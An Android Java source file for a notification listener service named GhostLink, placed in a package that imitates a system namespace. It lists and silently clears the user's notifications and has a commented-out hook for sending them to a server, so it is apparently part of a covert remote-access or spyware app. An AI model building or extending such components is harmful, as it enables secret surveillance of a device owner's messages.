package com.android.background.services;

import android.app.Notification;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import android.util.Log;

import com.android.background.services.helpers.NotificationsManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.List;

public class GhostLinkNotificationListenerService extends NotificationListenerService {

    private static final String TAG = "NotificationListener";
    private static GhostLinkNotificationListenerService instance;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "NotificationListenerService created");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        Log.d(TAG, "NotificationListenerService destroyed");
    }

    public static GhostLinkNotificationListenerService getInstance() {
        return instance;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        Log.d(TAG, "Notification posted: " + sbn.getPackageName());
        
        // Có thể gửi thông báo real-time về server nếu cần
        // sendNotificationToServer(sbn);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
        Log.d(TAG, "Notification removed: " + sbn.getPackageName());
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.d(TAG, "NotificationListenerService connected");
        
        // Lấy tất cả notifications hiện tại khi service được kết nối
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            StatusBarNotification[] activeNotifications = getActiveNotifications();
            Log.d(TAG, "Active notifications count: " + (activeNotifications != null ? activeNotifications.length : 0));
        }
    }

    /**
     * Lấy danh sách tất cả notifications hiện tại
     */
    public List<StatusBarNotification> getAllActiveNotifications() {
        List<StatusBarNotification> result = new ArrayList<>();
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                StatusBarNotification[] notifications = getActiveNotifications();
                if (notifications != null) {
                    for (StatusBarNotification sbn : notifications) {
                        result.add(sbn);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting active notifications: " + e.getMessage());
        }
        
        return result;
    }

    /**
     * Xóa tất cả notifications
     */
    public boolean clearAllNotifications() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                StatusBarNotification[] notifications = getActiveNotifications();
                if (notifications != null) {
                    for (StatusBarNotification sbn : notifications) {
                        cancelNotification(sbn.getKey());
                    }
                    Log.d(TAG, "Cleared " + notifications.length + " notifications");
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error clearing notifications: " + e.getMessage());
        }
        return false;
    }

    /**
     * Xóa notification cụ thể
     */
    public boolean clearNotification(String key) {
        try {
            cancelNotification(key);
            Log.d(TAG, "Cleared notification: " + key);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error clearing notification: " + e.getMessage());
            return false;
        }
    }

    /**
     * Kiểm tra xem service có đang hoạt động không
     */
    public static boolean isServiceRunning() {
        return instance != null;
    }

    /**
     * Lấy context của service
     */
    public static Context getServiceContext() {
        return instance != null ? instance.getApplicationContext() : null;
    }
}
